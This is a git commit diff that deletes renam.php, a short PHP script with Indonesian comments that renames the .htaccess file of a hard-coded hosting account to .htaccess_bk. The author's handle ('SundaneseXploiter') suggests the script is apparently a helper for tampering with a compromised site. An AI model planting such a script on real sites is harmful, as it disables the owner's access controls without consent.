fd5b29b8bbdf945c391cf718da0245dd44eddfb9
SUSUDOSU <155082990+SundaneseXploiter@users.noreply.github.com>
2025-07-03 00:34:52 +0700

    Update renam.php

--- renam.php
+++ renam.php
@@ -1,17 +1,1 @@
-<?php
-// Lokasi file .htaccess
-$original = '/home/nrpegeedu/public_html/.htaccess';
-$backup = '/home/nrpegeedu/public_html/.htaccess_bk';
 
-// Periksa apakah file .htaccess ada
-if (file_exists($original)) {
-    // Coba rename
-    if (rename($original, $backup)) {
-        echo "File berhasil di-rename menjadi .htaccess_bk.";
-    } else {
-        echo "Gagal merename file. Periksa izin file/folder.";
-    }
-} else {
-    echo "File .htaccess tidak ditemukan.";
-}
-?>
